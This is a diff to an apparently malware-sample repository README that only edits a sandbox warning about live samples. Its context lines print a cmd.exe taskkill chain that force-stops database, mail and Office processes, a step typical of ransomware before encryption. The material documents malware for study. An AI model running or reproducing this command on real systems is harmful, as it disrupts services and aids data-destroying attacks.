@@ -49,7 +49,7 @@ The Request looks like this:
   7. C:\Windows\system32\cmd.exe /c taskkill /im msftesql.exe&taskkill /im sqlagent.exe&taskkill /im sqlbrowser.exe&taskkill /im sqlservr.exe&taskkill /im sqlwriter.exe&taskkill /im oracle.exe&taskkill /im ocssd.exe&taskkill /im dbsnmp.exe&taskkill /im synctime.exe&taskkill /im agntsvc.exe&taskkill /im mydesktopqos.exe&taskkill /im isqlplussvc.exe&taskkill /im xfssvccon.exe&taskkill /im mydesktopservice.exe&taskkill /im ocautoupds.exe&taskkill /im agntsvc.exe&taskkill /im encsvc.exe&taskkill /im firefoxconfig.exe&taskkill /im tbirdconfig.exe&taskkill /im ocomm.exe&taskkill /im mysqld.exe&taskkill /im mysqld-nt.exe&taskkill /im mysqld-opt.exe&taskkill /im dbeng50.exe&taskkill /im sqbcoreservice.exe&taskkill /im excel.exe&taskkill /im infopath.exe&taskkill /im msaccess.exe&taskkill /im mspub.exe&taskkill /im onenote.exe&taskkill /im outlook.exe&taskkill /im powerpnt.exe&taskkill /im steam.exe&taskkill /im thebat.exe&taskkill /im thebat64.exe&taskkill /im thunderbird.exe&taskkill /im visio.exe&taskkill /im winword.exe&taskkill /im wordpad.exe
 
 
-# `#ff0000` !!  Do not run this without a sandbox environment. These are live samples and will kill your environment. I am not responsible for any damage. !!
+# !!  Do not run this without a sandbox environment. These are live samples and will kill your environment. I am not responsible for any damage. !!
 
  
 
